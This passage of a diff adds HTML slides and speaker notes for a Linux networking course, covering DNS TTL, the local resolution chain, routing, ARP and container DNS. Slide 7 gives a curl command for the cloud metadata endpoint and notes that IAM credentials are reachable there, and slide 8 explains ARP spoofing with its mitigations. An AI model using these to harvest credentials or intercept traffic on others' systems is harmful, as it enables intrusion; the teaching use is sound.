+            <div style="display:flex;align-items:center;gap:12px;padding:8px 12px;background:var(--bg4);border-radius:2px;">
+              <span class="mono tc" style="width:28px;font-size:.9rem;">1</span>
+              <div style="font-size:.87rem;"><strong>Browser DNS cache</strong> <span class="tm">— Chrome, Firefox cache answers locally. Separate from OS.</span></div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.74rem;">↓ miss</div>
+            <div style="display:flex;align-items:center;gap:12px;padding:8px 12px;background:var(--bg4);border-radius:2px;">
+              <span class="mono tc" style="width:28px;font-size:.9rem;">2</span>
+              <div style="font-size:.87rem;"><strong>OS stub resolver</strong> <span class="tm">— systemd-resolved at 127.0.0.53. Caches per TTL.</span></div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.74rem;">↓ miss</div>
+            <div style="display:flex;align-items:center;gap:12px;padding:8px 12px;background:var(--bg4);border-radius:2px;">
+              <span class="mono tc" style="width:28px;font-size:.9rem;">3</span>
+              <div style="font-size:.87rem;"><strong>Recursive resolver</strong> <span class="tm">— Pi-hole, ISP, 8.8.8.8. Shared cache across all clients.</span></div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.74rem;">↓ miss</div>
+            <div style="display:flex;align-items:center;gap:12px;padding:8px 12px;background:var(--gn-d);border-radius:2px;border:1px solid rgba(48,200,128,.2);">
+              <span class="mono tgn" style="width:28px;font-size:.9rem;">4</span>
+              <div style="font-size:.87rem;"><strong>Authoritative server</strong> <span class="tm">— the source of truth. Always fresh. Sets the TTL.</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="code" style="font-size:.8rem;">
+<span class="cm"># Watch TTL count down — run 3 times</span>
+dig github.com | grep -A1 "ANSWER"
+<span class="cm"># First run:  TTL 60</span>
+<span class="cm"># 30s later:  TTL 30  ← counting down</span>
+<span class="cm"># 60s later:  TTL 60  ← re-fetched, reset</span>
+
+<span class="cm"># Flush the OS cache</span>
+<span class="cm"># Ubuntu:</span>
+sudo resolvectl flush-caches
+<span class="cm"># RHEL8:</span>
+sudo systemd-resolve --flush-caches
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="g2" style="gap:.55rem;">
+          <div class="card ca cp">
+            <div class="mono" style="font-size:.64rem;text-transform:uppercase;letter-spacing:.1em;color:var(--cy);margin-bottom:.4rem;">Low TTL (60s)</div>
+            <p style="font-size:.84rem;color:var(--mut);">Fast failover. DNS changes propagate in minutes. Higher query load on resolvers. Use during migrations and for critical services.</p>
+          </div>
+          <div class="card cam cp">
+            <div class="mono" style="font-size:.64rem;text-transform:uppercase;letter-spacing:.1em;color:var(--am);margin-bottom:.4rem;">High TTL (86400)</div>
+            <p style="font-size:.84rem;color:var(--mut);">Low query load. Old IP can persist for 24 hours after a change. Safe for stable, rarely-changing records.</p>
+          </div>
+        </div>
+        <div class="callout qcr" style="font-size:.86rem;">
+          <strong>The migration trap — every engineer hits this once.</strong> You change a DNS record. An hour later half the world still sees the old IP. The reason: your previous TTL was 86400. Every resolver cached the old answer for up to 24 hours. The fix: lower TTL to 60 at least 24 hours <em>before</em> the change — not after. The old cache has to expire first.
+        </div>
+        <div class="callout qsl" style="font-size:.86rem;">
+          <strong>Negative TTL — the less-known gotcha.</strong> NXDOMAIN responses (name doesn't exist) are also cached, per the SOA's negative TTL. Create a record, query it too early, get NXDOMAIN cached — you'll wait for that negative cache to expire before you see the new record. <span class="mono ts">dig SOA github.com</span> — the last number in the SOA is the negative TTL.
+        </div>
+        <div class="callout qam" style="font-size:.86rem;">
+          <strong>The ops checklist for any DNS migration:</strong> Lower TTL 24h before → make change → wait for old TTL to expire across all resolvers → raise TTL back. Skipping step one is the most common cause of prolonged DNS propagation issues.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="5">
+  <strong>The TTL countdown demo is visceral:</strong> Run <code>dig github.com</code> three times with 30-second pauses between. Let them watch the TTL number count down. Then flush with <code>resolvectl flush-caches</code> and run again — TTL resets. This makes caching concrete in under 2 minutes.<br/><br/>
+  <strong>The migration trap story:</strong> <span class="say">"This is a rite of passage. Every engineer discovers this at 2am during their first DNS migration. They've changed the record. The monitoring is still red. Half the world still sees the old IP. The answer is always the same: you needed to lower the TTL 24 hours before the change, not after. Remember this and you'll skip that particular 2am."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S6  HOST RESOLUTION STACK
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="6">
+  <div class="gbg"></div><div class="snum">06</div>
+  <div class="content">
+    <div class="kicker r">What your OS actually does — Ubuntu 24.04 &amp; RHEL 8</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">The local resolution stack. Three files.<br/>One chain. Order matters.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.6rem;">The lookup chain on every query — before any network packet leaves</div>
+          <div style="display:flex;flex-direction:column;gap:.28rem;">
+            <div style="display:flex;align-items:flex-start;gap:12px;padding:9px 12px;background:var(--bg4);border-radius:2px;">
+              <span style="color:var(--am);font-family:'Bebas Neue',sans-serif;font-size:1.4rem;width:22px;flex-shrink:0;line-height:1;">1</span>
+              <div><span class="mono tam" style="font-size:.84rem;">/etc/nsswitch.conf</span>
+              <div style="font-size:.82rem;color:var(--mut);margin-top:2px;">Defines the order. Line: <span class="mono" style="color:var(--txt);">hosts: files dns</span> — check files first, then DNS. Change this to <span class="mono">dns files</span> and /etc/hosts is skipped unless DNS fails. This one line controls everything.</div></div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.74rem;">↓</div>
+            <div style="display:flex;align-items:flex-start;gap:12px;padding:9px 12px;background:var(--bg4);border-radius:2px;">
+              <span style="color:var(--cy);font-family:'Bebas Neue',sans-serif;font-size:1.4rem;width:22px;flex-shrink:0;line-height:1;">2</span>
+              <div><span class="mono tc" style="font-size:.84rem;">/etc/hosts</span>
+              <div style="font-size:.82rem;color:var(--mut);margin-top:2px;">Static overrides. Checked before any network query. How Docker injects container hostnames. How K8s sets pod identity. How you test DNS changes locally. Also an attack vector — we'll come back to this.</div></div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.74rem;">↓ (no match)</div>
+            <div style="display:flex;align-items:flex-start;gap:12px;padding:9px 12px;background:var(--bg4);border-radius:2px;">
+              <span style="color:var(--bl);font-family:'Bebas Neue',sans-serif;font-size:1.4rem;width:22px;flex-shrink:0;line-height:1;">3</span>
+              <div><span class="mono tb" style="font-size:.84rem;">/etc/resolv.conf</span>
+              <div style="font-size:.82rem;color:var(--mut);margin-top:2px;">Which resolver to query. On both Ubuntu and RHEL8 this is often a stub or managed file — not the real upstream config. Read below before trusting it.</div></div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.74rem;">↓</div>
+            <div style="display:flex;align-items:flex-start;gap:12px;padding:9px 12px;background:var(--gn-d);border-radius:2px;border:1px solid rgba(48,200,128,.2);">
+              <span style="color:var(--gn);font-family:'Bebas Neue',sans-serif;font-size:1.4rem;width:22px;flex-shrink:0;line-height:1;">4</span>
+              <div><span class="mono tgn" style="font-size:.84rem;">DNS query leaves the machine</span>
+              <div style="font-size:.82rem;color:var(--mut);margin-top:2px;">Only hits the network if nothing matched locally. Your recursive resolver takes it from here.</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <!-- OS comparison -->
+        <div class="card cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.55rem;">Ubuntu 24.04 vs RHEL 8 — the deltas that matter</div>
+          <div style="display:flex;flex-direction:column;gap:.35rem;">
+            <div class="osrow">
+              <div class="oscell"><span class="dbadge dub" style="margin-bottom:4px;display:inline-flex;">Ubuntu</span><br/><span class="mono" style="font-size:.76rem;color:var(--txt);">cat /etc/resolv.conf</span><br/><span style="font-size:.78rem;color:var(--mut);">→ nameserver 127.0.0.53 (stub)</span></div>
+              <div class="oscell"><span class="dbadge drh" style="margin-bottom:4px;display:inline-flex;">RHEL 8</span><br/><span class="mono" style="font-size:.76rem;color:var(--txt);">cat /etc/resolv.conf</span><br/><span style="font-size:.78rem;color:var(--mut);">→ may be static, NM-managed, or stub</span></div>
+            </div>
+            <div class="osrow">
+              <div class="oscell"><span class="mono" style="font-size:.76rem;color:var(--cy);">resolvectl status</span><br/><span style="font-size:.78rem;color:var(--mut);">real upstream config</span></div>
+              <div class="oscell"><span class="mono" style="font-size:.76rem;color:var(--cr);">resolvectl status</span><br/><span style="font-size:.78rem;color:var(--mut);">OR: nmcli dev show | grep DNS</span></div>
+            </div>
+            <div class="osrow">
+              <div class="oscell"><span class="mono" style="font-size:.76rem;color:var(--cy);">apt install bind9-dnsutils</span><br/><span style="font-size:.78rem;color:var(--mut);">for dig/nslookup</span></div>
+              <div class="oscell"><span class="mono" style="font-size:.76rem;color:var(--cr);">dnf install bind-utils</span><br/><span style="font-size:.78rem;color:var(--mut);">for dig/nslookup</span></div>
+            </div>
+            <div class="osrow">
+              <div class="oscell"><span class="mono" style="font-size:.76rem;color:var(--cy);">ss -ulnp | grep :53</span><br/><span style="font-size:.78rem;color:var(--mut);">what's on port 53</span></div>
+              <div class="oscell"><span class="mono" style="font-size:.76rem;color:var(--cr);">ss -ulnp | grep :53</span><br/><span style="font-size:.78rem;color:var(--mut);">same command — iproute ships on both</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="callout qam" style="font-size:.86rem;">
+          <strong>RHEL 8 — resolv.conf is not always what you think.</strong> NetworkManager can own resolv.conf on RHEL8. If you edit it manually, NM will overwrite it on next DHCP renewal. Configure DNS in <span class="mono tam">/etc/NetworkManager/conf.d/</span> or via <span class="mono tam">nmcli</span> — not by editing resolv.conf directly.
+        </div>
+        <div class="callout qcy" style="font-size:.86rem;">
+          <strong>Ubuntu 24.04 — resolv.conf lies.</strong> It points to 127.0.0.53 — a local stub run by systemd-resolved. The actual upstream resolver is configured in <span class="mono tc">/etc/systemd/resolved.conf</span>. Run <span class="mono tc">resolvectl status</span> for the real picture. Everyone who reads only resolv.conf gets burned by this.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="6">
+  <strong>nsswitch.conf is the most important line on this slide:</strong> <span class="say">"One line — <code>hosts: files dns</code> — controls the entire lookup order. Every query on this machine runs this decision chain. If you've ever wondered why ping resolves a name differently than your browser, it's because something in this chain has different configuration. Now you know where to look."</span><br/><br/>
+  <strong>The RHEL8/Ubuntu delta trips up real engineers:</strong> <span class="say">"If you're on RHEL8 and you edit /etc/resolv.conf, NetworkManager will overwrite it on the next DHCP renewal. You'll spend an hour wondering why your custom DNS setting keeps disappearing. Configure DNS through nmcli or the NetworkManager config directory — not by editing the file directly."</span><br/><br/>
+  <strong>Run the demo sequence live:</strong> <code>cat /etc/nsswitch.conf | grep hosts</code> → <code>cat /etc/hosts</code> → <code>cat /etc/resolv.conf</code> → <code>resolvectl status</code> → <code>ss -ulnp | grep :53</code>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S7  KERNEL ROUTING TABLE
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="7">
+  <div class="gbg"></div><div class="snum">07</div>
+  <div class="content">
+    <div class="kicker r">After DNS — the kernel takes over</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">The routing table. The name is gone.<br/>Now the kernel decides which door to use.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.6rem;">$ ip route show &nbsp;·&nbsp; <span class="tc">vpn7 · 10.0.0.154</span></div>
+          <div class="rtbl">
+            <div class="rhdr"><span>Destination</span><span>Via / Dev</span><span>Tag</span><span>Meaning</span></div>
+            <div class="rrow hi"><span class="tc">default</span><span class="tm">10.0.0.1  enp0s6</span><span><span class="pill pcy" style="font-size:.63rem;">metric 100</span></span><span class="tm">Unknown traffic exits here — the fallback of last resort</span></div>
+            <div class="rrow"><span class="tam">default</span><span class="tm">10.0.0.1  enp0s6</span><span><span class="pill pam" style="font-size:.63rem;">mtu 9000</span></span><span class="tm">OCI jumbo frame path — metric 1002, loses to primary</span></div>
+            <div class="rrow hi"><span>10.0.0.0/24</span><span class="tm">enp0s6</span><span><span class="pill pcy" style="font-size:.63rem;">local</span></span><span class="tm">Host's own subnet — directly connected, no gateway needed</span></div>
+            <div class="rrow"><span class="tam">169.254.169.254</span><span class="tm">enp0s6</span><span><span class="pill pam" style="font-size:.63rem;">metadata</span></span><span class="tm">Cloud instance metadata — link-local, non-routable outside host</span></div>
+            <div class="rrow hi"><span class="tgn">172.20.0.0/24</span><span class="tgn">br-3037a</span><span><span class="pill pgn" style="font-size:.63rem;">containers</span></span><span class="tm">Docker compose bridge — more on this in the containers session</span></div>
+          </div>
+        </div>
+        <div class="card ca cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.5rem;">Longest prefix match — the algorithm</div>
+          <div style="display:flex;flex-direction:column;gap:.6rem;">
+            <div style="padding:9px 12px;background:var(--bg4);border-radius:2px;">
+              <div class="mono" style="font-size:.68rem;text-transform:uppercase;color:var(--cy);margin-bottom:.3rem;letter-spacing:.08em;">Packet → 8.8.8.8</div>
+              <div class="code" style="font-size:.76rem;">No /32, /24, /16 match
+→ <span class="hgn">default 0.0.0.0/0</span> matches
+→ exit via <span class="hbl">enp0s6</span> to <span class="ham">10.0.0.1</span></div>
+            </div>
+            <div style="padding:9px 12px;background:var(--bg4);border-radius:2px;">
+              <div class="mono" style="font-size:.68rem;text-transform:uppercase;color:var(--gn);margin-bottom:.3rem;letter-spacing:.08em;">Packet → 172.20.0.3 (container)</div>
+              <div class="code" style="font-size:.76rem;"><span class="hgn">172.20.0.0/24</span> matches ← most specific
+→ directly connected via <span class="hbl">br-3037a</span>
+→ gateway 0.0.0.0 = local delivery</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card cb cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--bl);margin-bottom:.5rem;">Essential commands — Ubuntu &amp; RHEL 8 (identical)</div>
+          <div class="code">
+<span class="cm"># The routing table</span>
+ip route show
+
+<span class="cm"># Which route wins for THIS destination?</span>
+ip route get <span class="ham">8.8.8.8</span>
+ip route get <span class="hgn">172.20.0.3</span>
+
+<span class="cm"># Add / remove a route</span>
+sudo ip route add <span class="hbl">10.10.10.0/24</span> via 10.0.0.1
+sudo ip route del <span class="hbl">10.10.10.0/24</span>
+
+<span class="cm"># Interface state</span>
+ip addr show
+ip link show
+          </div>
+        </div>
+        <div class="callout qcy" style="font-size:.86rem;">
+          <strong><span class="mono tc">ip route get &lt;IP&gt;</span> is the single most useful routing debug command.</strong> It shows you exactly which route the kernel would pick right now for a given destination. Form a hypothesis from the table, run this to verify. This is how engineers actually debug routing.
+        </div>
+        <div class="callout qam" style="font-size:.86rem;">
+          <strong>169.254.169.254 — memorize this IP.</strong> Every major cloud platform (AWS, OCI, GCP, Azure) uses this link-local address for the instance metadata service. IAM role credentials, instance ID, network config — all accessible here. Non-routable outside the host. <span class="mono tam">curl http://169.254.169.254/latest/meta-data/</span> on any cloud VM.
+        </div>
+        <div class="callout qgn" style="font-size:.86rem;">
+          <strong>See the container bridge entry?</strong> <span class="mono tgn">172.20.0.0/24 via br-3037a</span> — that's Docker's compose network. Containers are just hosts hanging off a software bridge. From the kernel's perspective, routing to a container IP is identical to routing to any other host. Same lookup. Same rules. We'll build on this in the containers session.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="7">
+  <strong>Run ip route get live — interactive traces:</strong> <span class="say">"Before I run this — tell me which route wins for a packet to 8.8.8.8."</span> Get an answer. Then <code>ip route get 8.8.8.8</code>. Verify. Repeat for 172.20.0.3. The delta between hypothesis and output is where learning happens.<br/><br/>
+  <strong>The container bridge is a deliberate seed:</strong> <span class="say">"Notice this 172.20.0.0/24 entry. That's Docker's internal network. The kernel routes to containers exactly the same way it routes to any other host — longest prefix match, same algorithm. Containers didn't invent new networking. They reused everything you're learning right now inside isolated network namespaces."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S8  ARP — THE LAST TRANSLATION
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="8">
+  <div class="gbg"></div><div class="snum">08</div>
+  <div class="content">
+    <div class="kicker r">The last translation — before bits leave the NIC</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">ARP. IP address → MAC address.<br/>The layer nobody teaches until something breaks.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.6rem;">Why ARP exists — the gap DNS and routing leave open</div>
+          <p style="font-size:.9rem;color:var(--mut);margin-bottom:.7rem;">DNS gives you an IP. The routing table gives you a next-hop and an interface. But Ethernet frames need a <strong>MAC address</strong> — not an IP. ARP (Address Resolution Protocol) bridges that gap on the local segment.</p>
+          <div style="display:flex;flex-direction:column;gap:.3rem;">
+            <div style="padding:8px 12px;background:var(--bg4);border-radius:2px;font-size:.87rem;"><span class="tc bld">Step 1</span> <span class="tm">— Routing says: send to 10.0.0.1 via enp0s6</span></div>
+            <div style="padding:8px 12px;background:var(--bg4);border-radius:2px;font-size:.87rem;"><span class="tb bld">Step 2</span> <span class="tm">— ARP cache lookup for 10.0.0.1 → hit or miss</span></div>
+            <div style="padding:8px 12px;background:var(--bg4);border-radius:2px;font-size:.87rem;"><span class="tam bld">Step 3</span> <span class="tm">— If miss: broadcast on enp0s6 "Who has 10.0.0.1?"</span></div>
+            <div style="padding:8px 12px;background:var(--bg4);border-radius:2px;font-size:.87rem;"><span class="tgn bld">Step 4</span> <span class="tm">— Gateway replies with its MAC address. Cache it.</span></div>
+            <div style="padding:8px 12px;background:var(--gn-d);border-radius:2px;border:1px solid rgba(48,200,128,.2);font-size:.87rem;"><span class="tgn bld">Step 5</span> <span class="tm">— Ethernet frame built with gateway's MAC. Sent.</span></div>
+          </div>
+        </div>
+        <div class="callout qam" style="font-size:.86rem;">
+          <strong>Critical constraint — ARP is local segment only.</strong> You cannot ARP across a router. ARP broadcasts stay on the local subnet. When your packet needs to cross a router, the frame carries the <em>router's</em> MAC — not the final destination's MAC. The destination IP stays unchanged. The MAC changes at every hop.
+        </div>
+        <div class="card ccr cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cr);margin-bottom:.4rem;">ARP spoofing — why this matters for security</div>
+          <p style="font-size:.87rem;color:var(--mut);">ARP has no authentication. An attacker on the same segment can broadcast fake ARP replies: <em>"I have 10.0.0.1, my MAC is AA:BB:CC..."</em> — poisoning every host's ARP cache. Traffic meant for the gateway now flows through the attacker. This is a classic MITM attack on local networks. VLANs and Dynamic ARP Inspection (DAI) on managed switches mitigate it.</p>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card ca cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.5rem;">Commands — Ubuntu &amp; RHEL 8 (identical)</div>
+          <div class="code">
+<span class="cm"># The ARP / neighbor cache</span>
+ip neigh show
+arp -n   <span class="cm"># legacy, still works</span>
+
+<span class="cm"># Watch ARP resolve in real time</span>
+sudo tcpdump -i enp0s6 arp
+
+<span class="cm"># Flush a stale ARP entry</span>
+sudo ip neigh del 10.0.0.1 dev enp0s6
+
+<span class="cm"># Static ARP entry (permanent)</span>
+sudo arp -s 10.0.0.1 aa:bb:cc:dd:ee:ff
+          </div>
+        </div>
+        <div class="card cb cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--bl);margin-bottom:.4rem;">The full translation chain — now complete</div>
+          <div style="display:flex;flex-direction:column;gap:.28rem;">
+            <div class="frow"><div class="fbox on">curl github.com</div><span class="farr">→</span><div class="fbox">getaddrinfo()</div></div>
+            <div class="frow" style="padding-left:.8rem;"><div class="fbox">nsswitch chain</div><span class="farr">→</span><div class="fbox on">DNS: 140.82.121.4</div></div>
+            <div class="frow" style="padding-left:1.6rem;"><div class="fbox">ip route get</div><span class="farr">→</span><div class="fbox on">via 10.0.0.1 / enp0s6</div></div>
+            <div class="frow" style="padding-left:2.4rem;"><div class="fbox">ARP: who has 10.0.0.1?</div><span class="farr">→</span><div class="fbox on">MAC: aa:bb:cc:...</div></div>
+            <div class="frow" style="padding-left:3.2rem;"><div class="fbox on">Ethernet frame → wire</div></div>
+          </div>
+          <p style="font-size:.82rem;color:var(--mut);margin-top:.65rem;">Each layer is one translation. Name → IP → interface → MAC → frame. The application knows only the name. The wire knows only bits. Everything between is lookup tables.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="8">
+  <strong>The translation chain is the conceptual payoff of slides 2-8:</strong> <span class="say">"Stop and read this bottom to top. By the time a packet leaves the NIC, the DNS name is completely gone. It was translated to an IP by DNS. The IP was translated to a next-hop and interface by the routing table. The next-hop was translated to a MAC address by ARP. The MAC was wrapped in an Ethernet frame. Five translations. The application knew only the name. The wire knew only bits."</span><br/><br/>
+  <strong>tcpdump ARP demo:</strong> <code>sudo tcpdump -i enp0s6 arp</code> then in another terminal ping a host on the same subnet. They'll see the ARP who-has and reply packets. Real protocol traffic, not a diagram.
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S9  FULL PACKET JOURNEY
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="9">
+  <div class="gbg"></div><div class="snum">09</div>
+  <div class="content">
+    <div class="kicker r">Synthesis — putting it all together</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;"><span class="mono" style="font-size:.6em;color:var(--cy);">curl https://github.com</span><br/>Traced from keystroke to wire.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.5rem;">
+        <div class="card cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.6rem;">Every step — every system involved</div>
+          <div style="display:flex;flex-direction:column;gap:.25rem;font-size:.86rem;">
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--cy-d);border-radius:2px;border:1px solid rgba(0,212,245,.18);"><span class="tc bld mono" style="width:26px;">1</span><div><strong>curl calls getaddrinfo("github.com")</strong><div class="tm">libc resolver function — this is the OS entry point for all name resolution</div></div></div>
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--bg4);border-radius:2px;"><span class="tb bld mono" style="width:26px;">2</span><div><strong>/etc/nsswitch.conf → hosts: files dns</strong><div class="tm">Order established. Check files first.</div></div></div>
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--bg4);border-radius:2px;"><span class="ts bld mono" style="width:26px;">3</span><div><strong>/etc/hosts checked → no match</strong><div class="tm">github.com not in the static file. Proceed to DNS.</div></div></div>
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--bg4);border-radius:2px;"><span class="tb bld mono" style="width:26px;">4</span><div><strong>/etc/resolv.conf → query stub resolver</strong><div class="tm">127.0.0.53 (systemd-resolved) receives the query.</div></div></div>
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--bg4);border-radius:2px;"><span class="tc bld mono" style="width:26px;">5</span><div><strong>Recursive resolution: root → .com → github NS</strong><div class="tm">Three hops. Answer: 140.82.121.4. TTL 60. Cached.</div></div></div>
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--am-d);border-radius:2px;border:1px solid rgba(232,160,48,.2);"><span class="tam bld mono" style="width:26px;">6</span><div><strong>Name is gone. IP returned to curl: 140.82.121.4</strong><div class="tm" style="color:var(--am);">This is the moment DNS exits. Everything after is numbers.</div></div></div>
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--bg4);border-radius:2px;"><span class="tb bld mono" style="width:26px;">7</span><div><strong>Kernel routing lookup: ip route get 140.82.121.4</strong><div class="tm">No specific match → default route → next-hop 10.0.0.1 via enp0s6</div></div></div>
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--bg4);border-radius:2px;"><span class="ts bld mono" style="width:26px;">8</span><div><strong>ARP: who has 10.0.0.1?</strong><div class="tm">Broadcast on enp0s6. Gateway replies with MAC aa:bb:cc:... Cache it.</div></div></div>
+            <div style="display:flex;gap:10px;padding:7px 10px;background:var(--gn-d);border-radius:2px;border:1px solid rgba(48,200,128,.2);"><span class="tgn bld mono" style="width:26px;">9</span><div><strong>Ethernet frame built. Bits leave enp0s6.</strong><div class="tm">Destination IP: 140.82.121.4. Destination MAC: gateway's. The journey to GitHub begins.</div></div></div>
+          </div>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card cam cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--am);margin-bottom:.5rem;">Commands to observe every step live</div>
+          <div class="code" style="font-size:.78rem;">
+<span class="cm"># Step 2-3: the resolution order</span>
+cat /etc/nsswitch.conf | grep hosts
+cat /etc/hosts | grep github
+
+<span class="cm"># Step 4-5: DNS resolution</span>
+dig +trace github.com
+resolvectl query github.com
+
+<span class="cm"># Step 6: what IP did we get?</span>
+getent hosts github.com
+
+<span class="cm"># Step 7: routing decision</span>
+ip route get 140.82.121.4
+
+<span class="cm"># Step 8: ARP resolution</span>
+ip neigh show
+sudo tcpdump -i enp0s6 arp -n
+
+<span class="cm"># Full wire view — everything at once</span>
+sudo tcpdump -i enp0s6 host github.com -n
+          </div>
+        </div>
+        <div class="callout qcy" style="font-size:.87rem;">
+          <strong>The line that matters most — step 6.</strong> <span class="say">"The name disappeared at step 6. Everything after that is numbers — IP addresses, MAC addresses, bits. DNS is the bridge between the human world of names and the machine world of addresses. Once you cross that bridge, you're in pure network territory."</span>
+        </div>
+        <div class="callout qbl" style="font-size:.86rem;">
+          <strong>getent hosts — the underused command.</strong> <span class="mono tb">getent hosts github.com</span> uses the full NSS chain — nsswitch, /etc/hosts, DNS — exactly as any application would. It shows you what the OS actually resolves, not just what DNS says. Invaluable for debugging /etc/hosts overrides and split-horizon scenarios.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="9">
+  <strong>This slide is the payoff of the whole first half:</strong> <span class="say">"Every step we've covered in the last 8 slides — nsswitch.conf, /etc/hosts, DNS hierarchy, TTL, routing table, ARP — is right here in sequence. This is what happens every single time you open a socket to a remote host. Nine steps. Most developers are aware of maybe two of them."</span><br/><br/>
+  <strong>Run getent live — it surprises people:</strong> <code>getent hosts github.com</code> — then add an entry to /etc/hosts overriding github.com and run it again. Watch it return the override. Then remove the entry. This demonstrates the full NSS chain behaving exactly as applications see it.
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S10  DNS IN CONTAINERS & KUBERNETES
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="10">
+  <div class="gbg"></div><div class="snum">10</div>
+  <div class="content">
+    <div class="kicker r">The same primitives — applied at scale</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">Containers and Kubernetes didn't invent<br/>new networking. They reused everything you just learned.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.55rem;">The same concepts at three layers</div>
+          <div style="display:flex;flex-direction:column;gap:.4rem;">
+            <div style="padding:10px 13px;background:var(--bg4);border-radius:2px;border-left:3px solid var(--sl);">
+              <div style="font-weight:700;font-size:.9rem;margin-bottom:.3rem;"><span class="ts">Bare Metal</span> — what you know now</div>
+              <div style="font-size:.84rem;color:var(--mut);">DNS is external. One /etc/hosts, one /etc/resolv.conf, one routing table. The kernel handles it all.</div>
+            </div>
+            <div style="padding:10px 13px;background:var(--bg4);border-radius:2px;border-left:3px solid var(--bl);">
+              <div style="font-weight:700;font-size:.9rem;margin-bottom:.3rem;"><span class="tb">Docker</span> — per-network namespace</div>
+              <div style="font-size:.84rem;color:var(--mut);">Each container gets its own <span class="mono">/etc/hosts</span> and <span class="mono">/etc/resolv.conf</span> injected at start. The Docker daemon runs an embedded DNS resolver at <span class="mono tc">127.0.0.11</span> inside each custom network. Container names resolve to container IPs automatically — same mechanism as bare metal, scoped to the network namespace.</div>
+            </div>
+            <div style="padding:10px 13px;background:var(--bg4);border-radius:2px;border-left:3px solid var(--cy);">
+              <div style="font-weight:700;font-size:.9rem;margin-bottom:.3rem;"><span class="tc">Kubernetes</span> — cluster-scale DNS delegation</div>
+              <div style="font-size:.84rem;color:var(--mut);">CoreDNS runs as a pod. Every pod's <span class="mono">/etc/resolv.conf</span> points to the CoreDNS cluster IP. Service names follow a structured FQDN: <span class="mono tgn">svc.ns.svc.cluster.local</span>. This is the delegation tree concept — but CoreDNS is the root of the cluster's forest, not the internet root servers.</div>
+            </div>
+          </div>
+        </div>
+        <div class="callout qcy" style="font-size:.86rem;">
